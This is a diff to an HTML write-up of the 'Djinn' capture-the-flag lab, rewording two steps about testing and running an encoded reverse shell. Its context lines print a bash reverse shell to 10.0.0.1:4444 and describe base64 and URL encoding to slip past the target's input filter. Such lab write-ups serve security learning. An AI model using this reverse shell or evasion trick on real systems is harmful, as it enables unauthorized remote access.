@@ -46,14 +46,14 @@ layout: default
 
     <li>However, when we submit other commands such as a reverse shell, "bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'", it returns with "Wrong+choice+of+words".  It looks like user input is being filtered so I use base64 encoding to get around this.  First I encoded the command with base64 and then I piped the base64 encoded command into bash to be executed.</li>
     <ul>
-        <li>Here I demonstrate/test</li>
+        <li>I test the base64 encoded reverse shell by connecting to my own machine.</li>
         <img src="../images/djinn/base64_test.png">
     </ul>
 
     <br>
     <h2>Foothold</h2>
 
-    <li>Getting shell on Djinn using the base64 encoded command</li>
+    <li>Now that I have verified the command works, I execute the command against Djinn.  I also url-encode the command by highlighting the payload and pressing ctrl+u</li>
 
     <img src="../images/djinn/rev_shell.png">
 
